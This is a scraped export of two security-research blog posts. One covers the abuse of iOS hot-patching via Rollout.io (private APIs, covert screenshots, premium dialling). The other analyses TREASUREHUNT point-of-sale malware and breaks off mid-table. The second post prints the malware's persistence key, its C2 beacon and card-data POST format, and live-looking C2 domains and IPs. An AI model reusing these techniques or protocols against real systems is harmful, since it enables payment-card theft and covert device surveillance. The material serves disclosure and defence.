 <p>The <a href=""https://developer.apple.com/library/tvos/documentation/Carbon/Reference/WebKit_JavaScriptCore_Ref/index.html"" target=""_blank"">JavaScriptCore
  framework</a> was introduced into iOS at version 7. It allows one to
  evaluate JavaScript programs from within a C-based program. It also
  lets users insert custom objects to the JavaScript environment. On
  iOS, it is similar to an Objective-C wrapper of <a href=""https://developer.apple.com/library/ios/documentation/Cocoa/Reference/WebKit/ObjC_classic/"" target=""_blank"">WebKit’s
    JavaScript engine</a>, thus extending the capability and power of
  scripting beyond a web client to the whole app.<br /> <br /> The
  following four classes form the cornerstone of the framework:  <br />
  <br /> ●    <b>JSVirtualMachine</b> represents the virtual JavaScript
  runtime environment that allows JavaScript to run and to be executed.
  To initiate a virtual machine instance in Objective-C, one does the
  following:<br /> JSVirtualMachine *vm = [[JSVirtualMachine alloc]
  init];<br /> <br /> ●   <b> JSContext</b> talks to the above runtime,
  provides access to global objects that reside in the context, and
  performs the execution of JavaScript code. For example, in
  Objective-C, one can initiate a JSContext instance and declare a
  variable in the manner shown here:<br /> JSContext *context =
  [[JSContext alloc] initWithVirtualMachine:vm];<br /> context[@”name”]
  = @”Jean-Luc”;<br /> context[@”organization”] = @”Enterprise”;<br />
  <br /> ●    <b>JSValue</b> is the class that represents arbitrary data
  in JavaScript. For instance, we have:<br /> JSValue *name =
  context[@”name”];<br /> JSValue *organization =
  context[@“organization”];<br /> NSLog(@”Captain Name: %@
  \nOrganization: %@”, name, organization);<br /> <br /> ●  
   J<b>SExport</b> is a protocol that allows one to expose parts of
  Objective-C classes and methods to JavaScript. The wrapper created
  through this protocol functions as a passthrough between the
  Objective-C runtime and the JavaScript runtime. This one object thus
  facilitates the sharing between the two execution contexts allowing
  code in one environment to change the states of the other.</p>
 <h5>Rollout Patch Capability<br /> </h5>
 <p>Rollout exposes to developers only a limited set of JavaScript APIs
  that can be permitted in the Objective-C runtime environment. Its <a href=""http://support.rollout.io/docs/javascript-docs"" target=""_blank"">API
  documentation</a> shows the following essentials:<br /> <br /> ●  
   <b>R</b>: the Rollout namespace object that allows integration with
  the Rollout SDK, the containing function, and the application’s
  runtime. Within which, it offers the functionality of the Foundation C
  function <a href=""https://developer.apple.com/library/ios/documentation/Cocoa/Reference/Foundation/Miscellaneous/Foundation_Functions/"" target=""_blank"">NSClassFromString,</a>
  as shown in Figure 7.<br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%207.png"" />
  <br /> </p>
 <p>
  <span class=""type-XS"">Figure 7: Portion of Rollout 'R' namespace</span></p>
 <p>
  <br /> ●    <b>ObjcBox</b>: encapsulates Objective-C NSObject
  instances. It allows a transformation from an Objective-C instance to
  a JavaScript value. There are two important functions, as shown in
  Figure 8:<br />  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%208.png"" />
  <br /> <span class=""type-XS"">Figure 8: Portion of Rollout ObjcBox namespace</span></p>
 <p>The APIs provided by Rollout and the legitimate use cases they
  describe for their hot patching infrastructure are simple, limited,
  and benign. However, as with many well-intentioned solutions, the
  possibilities of misuse or abuse remain when malicious individuals
  think outside the box.<br /> </p>
 <h5>The Usual Suspects</h5>
 <p>In our blog on JSPatch, we outlined several attack capabilities that
  could be carried out against that technology, such as loading
  arbitrary public or private frameworks into an app. The types of
  capabilities we described for JSPatch also work against Rollout,
  though we do not provide specific examples here. Instead, we highlight
  a few additional scenarios specific to Rollout to avoid
  duplication.<br /> <br /> <b>Example 1: Load arbitrary private
    frameworks and utilize unauthorized private APIs</b></p>
 <p>●    Targeted private framework:
  /System/Library/PrivateFrameworks/CoreRecents.framework<br /> ●  
   Targeted private API: [[CRRecentContactLibrary defaultInstance]
  maxDateEventsPerRecentContact]<br /> <br /> Figure 9 and Figure 10
  show sample exploitation code and the associated console output
  loading the private framework CoreRecents.framework.<br />  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%209.png"" />
  <br /> <span class=""type-XS"">Figure 9: Sample exploitation code for
    loading a private framework</span>
  <br /> <br /> Console Output:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%2010.png"" />
  <br /> <span class=""type-XS"">Figure 10: Sample console output showing
    successful load of the framework</span>
  <br /> <br /> Both this example and the following ones make use of
  Apple iOS private APIs. The pros and cons of the use of these private
  APIs by third party apps has been <a href=""https://news.ycombinator.com/item?id=10412401"" target=""_blank"">at the center of much debate</a>. In general, common
  sense suggests that the use of Apple’s private APIs by third party
  apps is risky due to security risks as well as stability concerns (for
  example, unexpected behavior if Apple changes the internals of the
  private APIs). Despite Apple’s efforts to <a href=""https://developer.apple.com/app-store/review/guidelines/"" target=""_blank"">prohibit the practice of utilizing non-public
  APIs</a>, it has proven difficult to identify their use when
  developers use obfuscation and other even more clever and
  sophisticated maneuvers.<br /> <br /> That said, when an app developer
  with malicious intent makes use of these private APIs, the use of the
  APIs will leave traces within the app code itself. This means the
  malicious code within the app is subject to potential discovery by
  Apple or a third party. However, with Rollout’s dynamic hot patching
  process, the intent – that is, the malicious code – can be separated
  from the app binary itself in the form of a hot patch. Rollout, as a
  remote hot patching solution, is not the only means one can resort to
  separating private API calls from the app binary, but it lowers the
  bar for malware developers to achieve so.</p>
 <p>
  <b>Example 2: Load arbitrary public frameworks and utilize
    unauthorized private APIs</b></p>
 <p>●    Targeted public framework:
  /System/Library/Frameworks/AVFoundation.framework<br /> ●    Targeted
  private API: [AVCaptureDevice devices]<br /> <br /> Figure 11 and
  Figure 12 show sample code used to successfully access the iPhone’s
  cameras and microphone.    </p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%2011.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 11: Example exploit code loading public
    framework to access the private AVCaptureDevice API</span>
  <br /> <br /> Console outputs three devices: Back Camera; Front
  Camera; iPhone Microphone.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%2012.png"" />
  <br /> <span class=""type-XS"">Figure 12: Console output showing access
    to the iPhone cameras and microphone</span>
  <br /> <br /> <b>Example 3: Test device for the presence of a targeted app</b>
  <br /> <br /> The ability for one app to check for the presence of
  another app raises both privacy and security concerns (for example,
  checking for the presence of an app in order to exploit it). The
  primary method for obtaining a list of installed apps is through the
  private API [LSApplicationWorkspace allInstalledApplications]. As we
  have seen, use of these private APIs is prohibited by Apple’s
  Developer Program License Agreement.<br /> <br /> Some app developers
  have sought other means to determine installed apps without using
  Apple’s private APIs. For example, iHasApp used the public API
  [UIApplication canOpenURL:] to identify installed apps <a href=""https://github.com/danielamitay/iHasApp/blob/master/FAQ.md#how-does-it-detect-apps"" target=""_blank"">based on their supported URL schemes</a>.
  Unfortunately, the extensive usage of the API and associated detection
  method in a large volume of apps resulted in iHasApp and its <a href=""https://github.com/danielamitay/iHasApp"" target=""_blank"">derived framework being shut down by Apple</a>, and
  the API being flagged during the app store vetting process.<br />
  <br /> However, Rollout eliminates this constraint because the API can
  be called via a hot patch outside of the app itself.<br /> <br />
  Figure 13 and Figure 14 show sample code using canOpenURL: to detect
  installed apps.<br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%2013.png"" />
    <span class=""type-XS"">Figure 13: Sample exploit code calling canOpenUrl</span>
  <br />  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%2014.png"" />
  <br /> <span class=""type-XS"">Figure 14: Console output showing app detection</span></p>
 <p>
  <b>Example 4: Make phone calls to premium numbers without consent</b>
  <br /> <br /> By utilizing the public API [UIApplication openURL:],
  one can launch the native mobile phone app and make a phone call to an
  arbitrary premium number. This activity would be immediately visible
  to the user when the phone app interface was unexpectedly displayed.
  However, use of the exploit could be fine-tuned by applying
  environmental checks (for example, only initiate calls when the user
  is asleep) and maintaining a status of long running background process
    <a href=""https://www.raywenderlich.com/29948/backgrounding-for-ios"" target=""_blank"">through background modes</a>.  <br /> <br /> Figure
  15 and Figure 16 show sample code for dialing a premium number and the
  successful connection.    </p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%2015.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 15: Sample exploit code used to dial a
    premium phone number</span>
  <br /> <br />  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%2016.png"" />
  <br /> <span class=""type-XS"">Figure 16: Console output showing
    successful call</span>
  <br /> <br /> <b>Example 5: Take screenshot without informing the user</b>
  <br /> <br /> Figure 17, Figure 18, and Figure 19 show that through
  the patch, one can take screenshots of the current foreground screen
  by utilizing non-public API [UIImage createSnapshotWithRect:] without
  the user’s knowledge. The screenshots are saved in the sandbox of the
  application, which can be further exflitrated outside of the device.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%2017.png"" />
  <br /> <span class=""type-XS"">Figure 17: Sample exploit code showing
    the use of private API [UIImage createSnapshotWithRect:] to capture
    the screen</span></p>
 <p>
  <br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%2018.png"" />
  <br />  <br /> <span class=""type-XS"">Figure 18: Console output showing
  </span>that the captured screenshot has been saved to the
  sandbox<br />  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%2019.png"" />
  <br /> <span class=""type-XS"">Figure 19: App sandbox content showing
    the captured images</span></p>
 <p>All of the above tests were performed on a device that runs iOS 8.4.
  Apple has released a number of iOS versions through the years to fix
  and close security holes reported by both industry practitioners and
  academic researchers. Most of the private or public APIs that could
  have been abused are protected through various access controls  (e.g.,
    <a href=""https://developer.apple.com/library/mac/documentation/Miscellaneous/Reference/EntitlementKeyReference/Chapters/AboutEntitlements.html"" target=""_blank"">entitlements to the Address Book</a>) in newer
  versions of iOS. However, the reality is that there are a significant
  number of users who are not keeping their devices’ OS version
  up-to-date. The ramifications are that “old” attacks through private
  APIs, which are ineffective against iOS 8.4 or iOS 9, would still be
  effective against some devices.</p>
 <h5>Threat Scenario</h5>
 <p>In <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2016/01/hot_or_not_the_bene.html"" target=""_blank"">our earlier blog on JSPatch,</a> we highlighted
  three general attack scenarios using an iOS remote hot-patching
  vector. Of these, two are still present on Rollout in a similar
  fashion:<br /> <br /> 1.    Precondition: 1) Embedded 3rd party ad SDK
  is malicious.<br /> a.    Consequences: ad SDK has the right to write
  to the database, which allows it to change the behavior of the
  app.<br /> 2.    Precondition: 1) App developer is malicious.<br />
  a.    Consequences: app developers can perform stealthy persistent but
  temporary actions against the user including by utilizing Private
  APIs.<br /> <br /> It has been <a href=""https://medium.com/@Prusak/a-secure-alternative-to-jspatch-d4f36671e8ae#.xrqhe6pzs"" target=""_blank"">pointed out that an app developer</a> with malicious
  intent will strive to find a way to distribute their malicious app
  regardless of the particular framework used. That is, no existing
  distribution method can fully guard against malicious intent. While we
  agree with this statement, we also believe it is important to
  understand how different distribution methods may help or hinder a
  malicious developer in deploying their malicious code. A developer
  wishing to distribute a malicious app through the App Store would need
  to slip the malicious code past the review process. The third-party
  hot patching frameworks developed to date do not include any review
  process, so it helps to understand how malicious patches could be
  distributed and where (or whether) they could be detected.<br />
  <br /> A risk of hot patching frameworks is that because patches can
  be deployed ‘on the fly’, a developer could distribute a legitimate
  app, temporarily deploy a patch to carry out specific malicious
  activity, and then deploy another patch to revert the app back to its
  normal, non-malicious behavior. Because this activity can occur
  automatically in the background, users are highly unlikely to notice
  the change, and replacement of the malicious patch with a “clean” one
  could leave little evidence that anything suspicious had
  occurred.<br /> <br /> To put the threat scenario in perspective, we
  provide a visualization of such an attack to reinforce the concept and
  facilitate understanding.  </p>
 <h5>Fictional Malicious Plotting<br /> </h5>
 <p>
  <b>Synopsis</b>
  <br /> Our fictional app FortitudeSeries was a new release of an iOS
  app that allows one to add filters to selected photos from the device
  photo gallery and save the edited photos back to the gallery. In order
  to offer the user a better experience with quality performance and
  stable software, we decided to use the Rollout.io service to maintain
  the ability to remotely hot-patch bugs and security issues should they
  be discovered in the future.<br /> <br /> After testing several
  patches, we identified several actions we could take outside of what
  the app was originally designed for. We first tried saving an original
  copy of all the filtered photos in the sandbox, and it was a quick
  success. We then became curious about the photos the user does not
  select for filtering, so we issued a new patch to capture a screenshot
  of the user’s photo gallery. This too was simple to achieve.</p>
 <p>
  <br /> <b>Production</b>
  <br /> Our fictional attack is demonstrated through three stages to
  show the following scenarios:<br /> <br /> ●    <b>Stage 1</b>:
  Rollout patching is disabled in the backend. FortitudeSeries only
  exhibits its legitimate behavior. A user selects a photo from the
  photo gallery by pressing the button “Select A Photo”. Once the photo
  is selected, the console outputs “Filtering the selected image” and
  the photo gallery view is dismissed. The app’s Documents directory
  does not hold any data, therefore, it remains empty. Figure 20 shows
  the source code of the main view controller of FortitudeSeries.<br />
     <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%2020.png"" />
  <br /> <br /> <span class=""type-XS"">Figure 20: Objective-C code for
    the core implementation of fictional app FortitudeSeries</span>
  <br /> <br /> ●    <b>Stage 2:</b> Rollout patch is enabled with the
  code shown in Figure 21. The user restarts the app and performs the
  same sequence of actions. The app’s Documents directory keeps a record
  of the selected photos and labels them with the timestamp of the photo
  that was selected.<br />    <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%2021.png"" />
  <br /> <br /> <span class=""type-XS"">Figure 21: Rollout patch code for
    saving a copy of the user selected photo in the sandbox</span>
  <br /> <br /> ●    <b>Stage 3</b>: Rollout patch is enabled with
  different code, as shown in Figure 22. The user restarts the app and
  performs the same sequence of actions described above. The app takes a
  screenshot of the photo gallery and saves a copy to the sandbox
  Documents directory using the same naming scheme presented
  above.<br />  <br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%2022.png"" />
  <br /> <span class=""type-XS"">Figure 22: Rollout patch code for
    capturing a screenshot of the photo gallery in stealth</span>
  <br /> <br /> Once the data is in the sandbox of the app, the app may
  deal with it however it wants. A conceivable approach is to exfiltrate
  it to a developer-controlled server. It should not be surprising that
  this can be done via a Rollout patch script that executes at runtime
  without Apple’s knowledge.  <br /> <br /> The operation of the demo is
  therefore done in the following three stages:<br /> <br /> ●  
     <b>Stage 1</b>: Develop FortitudeSeries in Objective C and Rollout;
  deploy it to a user device to allow the user filter selected photos;
  check the Rollout patch; perform the expected actions on the installed
  app; check the console log; check the sandbox Documents
  directory;<br /> ●   <b> Stage 2</b>: Enable Rollout patch with script
  for scenario I; restart the app; perform the expected actions on the
  installed app; check the console log; check the sandbox Documents
  directory;<br /> ●    <b>Stage 3</b>: Comment out the patch script for
  scenario I and enable script for scenario II; restart the app; perform
  the expected actions on the installed app; check the console log;
  check the sandbox Documents directory.<br /> <br /> Primed with the
  above depiction, it should be easy to understand the recorded demo
  below even without a narrative.</p>
 <p></p>
 <h5>Rollout Security Defense<br /> </h5>
 <p>The chances of a successful man-in-the-middle (MITM) attack through
  the use of poor encryption (or no encryption) of the patch script
  content can be reduced significantly through secure implementation of
  the app and any supporting hot patching framework.<br /> <br /> To
  prevent patches from being tampered with, Rollout invested in the
  following security measures:<br /> <br /> ●    The app retrieves the
  patch data from Rollout.io server through HTTPS. This significantly
  lowers the chances of being a target of MITM attacks.<br /> ●    The
  patch data is signed by a Rollout.io private key and therefore can
  only be decrypted by a key that’s known to the iOS app.<br /> </p>
 <h5>Security Weakness</h5>
 <p>The above protection ensures that data is secure in transmission.
  However, once the patch data lands on the device, it is decrypted
  accordingly and stored in the sandbox in plaintext. Figure 23 shows
  the directory #APP_SANDBOX/Library/Caches/#APP_ID containing a
  specific database Cache.db that contains data resulting from the hot
  patch network communications.<br />  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%2023.png"" />
  <br /> <br /> <span class=""type-XS"">Figure 23: File structure view of
    the directory encompasses the database of patch data</span>
  <br /> <br /> All patches that have been pushed to production and
  received by the client app are stored as a record in the table
  cfurl_cach_receiver_data as shown in Figure 24.<br />  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%2024.png"" />
  <br /> <br /> <span class=""type-XS"">Figure 24: DB table
    cfurl_cach_receiver_data containing all records of production patches</span>
  <br /> <br /> Each patch is stored in the receiver_data column in JSON
  format. The JavaScript code is mapped to the key “configuration” in
  based64 format. For example, the highlighted data blob in Figure 24
  contains the based64 encoded content shown in Table 1:<br /> <br />
    <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/table-1.PNG"" />
  <br /> <span class=""type-XS"">Table 1: base64 content from patch database</span>
  <br /> <br /> Its corresponding ASCII format is the data is shown in
  Figure 25.<br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rollout%20Jing%20Xie%20and%20Jimmy%20Su/Figure%2025.png"" />
  <br /> </p>
 <p>
  <span class=""type-XS"">Figure 25: Decoded base64 content</span>
  <br /> <br /> Given Rollout’s existing security measures such as HTTPS
  and asymmetric encryption, as well as iOS’s sandbox, this weakness is
  a minor issue. Since there are other attack vectors that can be more
  easily exploited (for example those described in our threat scenario I
  and II), a third party library may be less motivated to tamper the
  patch to their advantage. Should circumstances change and one chooses
  to do, this weakness is really to be leveraged.</p>
 <h5>Field Survey</h5>
 <p>Rollout’s web site states that its product is “trusted by thousands
  of mobile app developers”. As Rollout provides a solution for a
  problem that is unique to iOS developers, we can speculate that all
  its customers are iOS app developers at this point. Though a few have
  been highlighted on their main page, the exact number of App
  Store-approved apps that use Rollout SDK is unknown. We performed a
  scan using FireEye’s infrastructure in late 2015 and found 130 apps
  that have been or still are in the App Store using Rollout as a remote
  hot patching solution. This number has since grown to 245 as of Jan.
  19, 2016.  <br /> <br /> As opposed to apps that adopted JSPatch as
  the remote hot patching solution, which are predominantly Chinese apps
  for Chinese speaking users, apps that use Rollout are mostly marketed
  towards English speaking users. Many offer localization for a variety
  of languages. There are no distinct features among these apps; they
  span a variety of categories including education, social networking,
  magazines and newspapers, lifestyle, photo and video, games and more.
  Most of the apps have very low user adoption in the App Store at this
  point. The most popular app seems to have accumulated a download
  record of 62,869 times, while the vast majority have no popularity
  rating on file.  <br /> <br /> At the time of this writing, we have
  not confirmed any malicious activity related to any app that uses the
  Rollout SDK. We are simply reporting on potential vulnerabilities and
  avenues for misconduct that could potentially be exploited when using
  this tool. </p>
 <h4>Epilogue</h4>
 <h5>Conclusions</h5>
 <p>iOS remote hot-patching through a non-Objective-C language to
  effectively evade the Apple review process – a process that has so far
  largely led to a safe and clean app ecosystem – is now a reality. Our
  analysis has placed JSPatch and Rollout under the spotlight as
  examples of two hot patching frameworks with very different characteristics:</p>
 <ul> <li>JSPatch is developed by a Chinese developer; Rollout.io is
    provided by an Israel-based company.</li> <li>JSPatch is open
    sourced; Rollout.io is a commercial product.</li> <li>JSPatch is
    adopted mostly by Chinese app developers; Rollout.io is marketed to
    English speaking or international developers.</li> <li>JSPatch and
    Rollout.io offer different syntax and capabilities for JavaScript
  code.</li> <li>The infrastructures are far from the same.</li> </ul>
 <p>Despite differences in their implementation, both are similar in
  that they potentially allow a developer to turn an innocuous looking
  app into something malicious – all while circumventing Apple’s App
  Store vetting process. What’s more, the underlying “biology” is the
  same for the two solutions: the combination of JavaScriptCore
  framework and method swizzling.</p>
 <p>When conducting our research, we contacted Rollout regarding the
  issues described in this post. We gratefully acknowledge Rollout’s
  responsiveness and assistance in addressing them. As a result, Rollout
  has indicated that they will prevent developers from accessing iOS
  private APIs and private frameworks in their future releases of the
  product so that all patch code is subject to the same types of checks
  as those in the Apple review process. With Rollout’s upcoming release,
  the attack examples shown here would be thwarted.</p>
 <h5>Additional Food for Thought</h5>
 <p>The current limitations of the App Store review process and the
  desire from developers for a faster solution means that hot patching,
  as a process, is unlikely to go away any time soon. We hope that by
  describing these underlying risks, patch framework developers will
  institute additional security controls to ensure that they are
  providing developers with convenience and productivity in iOS app
  development all while maintaining a clean and safe ecosystem.</p>
 <p>In this ecosystem, iOS users are the least able to protect
  themselves and, consequently, the most vulnerable. When it comes to
  user security, it is difficult to decide which single stakeholder
  should assume the responsibility of maintaining and sustaining a safe
  and clean iOS mobile environment. While Apple has come a long way in
  keeping its mobile users safe from malware, the task has become
  increasingly difficult. It is not outrageous to expect third party
  library or framework providers to offer extra security to ensure their
  services are not being abused.</p>
 <p>While we do not have a definite solution for this complicated issue,
  we believe a system that functions as follows could potentially
  increase iOS user security: 1) App developers providing to Apple a
  list of the third party libraries and frameworks that they use, 2) The
  underlying technologies of third party libraries and frameworks being
  provided to Apple, and 3) Third party library or framework providers
  improving security to ensure their services are used as intended.</p>
 <p> </p>",http://www.fireeye.com/blog/threat-research/2016/04/rollout_or_not_the.html
TREASUREHUNT: A Custom POS Malware Tool,"<p>Since early 2015, FireEye Threat Intelligence has observed the
  significant growth of point-of-sale (POS) malware families in
  underground cyber crime forums. POS malware refers to malicious
  software that extracts payment card information from memory and
  usually uploads that data to a command and control (CnC) server.</p>
 <p>Although the PCI DSS rules changed in October 2015, leaving
  retailers who have not transitioned from existing “swipe” cards to EMV
  or “chip” enabled cards liable for card present fraud in more ways
  than before, many retailers are still in the process of transitioning
  to chip-enabled card technology. Criminals appear to be racing to
  infect POS systems in the United States before US retailers complete
  this transition. In 2015, more than a dozen new POS malware families
  were discovered.<a href=""https://www.fireeye.com/blog/threat-research/_jcr_content.feed#_ftn1"" name=""_ftnref1""></a>[1]</p>
 <p>POS malware may be freely available, available for purchase, or
  custom-built for specific cyber criminals. Free tools are often a
  result of malware source code being leaked, and tend to be older and
  more easily detected by security software. POS malware available for
  purchase may be newly developed tools or modified versions of older
  tools. Then there is another class of POS malware that is developed
  for use exclusively by a particular threat group.</p>
 <p>In this article we examine TREASUREHUNT, POS malware that appears to
  have been custom-built for the operations of a particular “dump shop,”
  which sells stolen credit card data. TREASUREHUNT enumerates running
  processes, extracts payment card information from memory, and then
  transmits this information to a command and control server.</p>
 <h5>TreasureHunter Version 0.1</h5>
 <p>TREASUREHUNT, which is briefly described <a href=""https://isc.sans.edu/diary/How+Malware+Generates+Mutex+Names+to+Evade+Detection/19429/"">here</a>,
  gets its name from a specific string visible in the binary:</p>
 <p>        C:\Users\Admin\documents\visual studio 2012\Projects\treasureHunter\Release\treasureHunter.pdb</p>
 <p>Some samples contain a string referencing the version number 0.1:</p>
 <p style=""text-align: center;"">        TreasureHunter version 0.1
  Alpha, created by Jolly Roger<br />         (jollyroger@prv.name) for
  BearsInc. Greets to Xylitol and co.</p>
 <p>In a typical scenario, TREASUREHUNT would be implanted on a POS
  system through the use of previously stolen credentials or through
  brute forcing common passwords that allow access to poorly secured POS systems.</p>
 <p>When executed, TREASUREHUNT installs itself to the %APPDATA%
  directory and sets up a registry ‘run’ key for persistence:</p>
 <p>        HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\jucheck</p>
 <p>The malware will then initiate a beacon to a CnC server. The
  connection to the CnC server is via HTTP POST:</p>
 <p>
  <span class=""code"">POST /megastock/gate.php?request=true
    HTTP/1.1<br />  Content-Type:
    application/x-www-form-urlencoded<br />  User-Agent: Mozilla/5.0
    (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2;
    SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR
    2.0.50727)<br />  Host: millionjam[.]eu<br />  Content-Length: 78</span>
  <br /> <span class=""code"">Connection: Keep-Alive</span></p>
 <p>
  <span class=""code"">request=a0edee4769109a&amp;use=6fGhtyNfd97Jqw3&amp;id=[REDACTED]</span></p>
 <p>The 'request' value on the POST data is the encoded string
  'GETKEYS'. The 'use' string is hardcoded and may be a campaign
  identifier. The ’id‘ is a unique identifier for the compromised
  system. The response from the CnC server is expected to contain the
  encoded string 'success'.</p>
 <p>The malware scans all running processes and ignores processes that
  contain System33, SysWOW64, or \Windows\explorer.exe in their module
  names. It searches for payment card data and, if found, sends the data
  encoded back to the CnC server.</p>
 <p>When payment card data is found, it is sent back to the CnC server using:</p>
 <p>        POST  /gate.php?report=true</p>
 <p>The data sent back contains the following tags:</p>
 <p>        report=&lt;encoded_track_data&gt;&amp;id=&lt;encoded_data&gt;</p>
 <p>The operators control the compromised systems and harvest stolen
  payment card information through a web interface located on the CnC server.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/TREASUREHUNT%20Villanueve/Fig1.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Login interface on a TREASUREHUNT CnC server</span></p>
 <p>All of the TREASUREHUNT samples identified so far contain the same
  compilation timestamp of 2014-10-19 07:14:39. This is likely an
  artifact of the builder rather than the time the samples were actually compiled.</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""184""><p>MD5</p> </td> <td colspan=""2"" valign=""top"" width=""122""><p>Domain</p> </td> <td colspan=""2"" valign=""top"" width=""137""><p>Path</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""184""><p>cec2810556c63e9c225afb6a5ca58bc1</p> </td> <td colspan=""2"" valign=""top"" width=""122""><p>millionjam.eu</p> </td>
        <td colspan=""2"" valign=""top"" width=""137""><p>/megastock/gate.php</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""184""><p>cb75de605c171e36c8a593e337275d8f</p> </td> <td colspan=""2"" valign=""top"" width=""122""><p>cortykopl.com</p> </td>
        <td colspan=""2"" valign=""top"" width=""137""><p>/sdfsgsdsdssdf/gate.php</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""184""><p>6a9348f582b2e121a5d9bff1e8f0935f</p> </td> <td colspan=""2"" valign=""top"" width=""122""><p>91.232.29.83</p> </td>
        <td colspan=""2"" valign=""top"" width=""137""><p>/sdfsgsdsdssdf/gate.php</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""184""><p>070e9a317ee53ac3814eb86bc7d5bf49</p> </td> <td colspan=""2"" valign=""top"" width=""122""><p>179.43.160.34</p> </td>
        <td colspan=""2"" valign=""top"" width=""137""><p>/wp-content/temp/gate.php</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""184""><p>3e2003878b364b5d77790109f24c9137</p> </td> <td colspan=""2"" valign=""top"" width=""122""><p>3sipiojt.com</p> </td>
        <td colspan=""2"" valign=""top"" width=""137""><p>/noth/gate.php</p>
      </td> </tr>
    <tr>
      <td valign=""top"" width=""184""><p>21f99135f836fb4d3f4685d704a4460d</p> </td> <td colspan=""2"" valign=""top"" width=""122""><p>friltopyes.com</p> </td>
        <td colspan=""2"" valign=""top"" width=""137""><p>/southcal/gate.php</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""184""><p>ea6248e4ddd080e60e6140ab0f8562e1</p> </td> <td colspan=""2"" valign=""top"" width=""122""><p>seatrip888.eu</p> </td>
        <td colspan=""2"" valign=""top"" width=""137""><p>/gate.php</p> </td> </tr>
    <tr>
      <td colspan=""2"" valign=""top"" width=""185""><p>48692beb88058652115b5c447cd28589</p> </td> <td colspan=""2"" valign=""top"" width=""122""><p>friltopyes.com</p> </td>
        <td valign=""top"" width=""136""><p>/alabol/gate.php</p> </td> </tr>
    <tr>
      <td colspan=""2"" valign=""top"" width=""185""><p>9f9c2e6072e0a233631d234bdcf1b293</p> </td> <td colspan=""2"" valign=""top"" width=""122""><p>friltopyes.com</p> </td>
        <td valign=""top"" width=""136""><p>/nothcal/gate.php</p> </td> </tr>
    <tr>
      <td width=""195""> </td> <td width=""1""> </td> <td width=""121""> </td>
        <td width=""1""> </td> <td width=""136""> </td> </tr></tbody></table>
 <p>
  <span class=""type-XS"">Table 1: TREASUREHUNT v0.1 hashes and CnC details</span></p>
 <h5>TreasureHunter Version 0.1.1</h5>
 <p>We identified more recent and slightly modified versions of
  TREASUREHUNT. While the compile timestamp remains the same as the
  previous version, the samples were first observed on Nov. 25, 2015,
  and March 3, 2016. The only significant change in this version is that
  the malware stores encoded configuration data in the NTFS alternate
  data streams (ADS) of the file %USERPROFILE%\ntuser.ini. We refer to
  these samples as version 0.1.1” due to the presence of the following string:</p>
 <p style=""text-align: center;"">        TreasureHunter version 0.1.1
  Alpha, created by Jolly Roger<br />         (jollyroger@prv.name) for
  BearsInc. Greets to Xylitol and co.</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""185""><p>MD5</p> </td> <td valign=""top"" width=""122""><p>Domain</p> </td> <td valign=""top"" width=""136""><p>Path</p> </td> </tr>
    <tr>
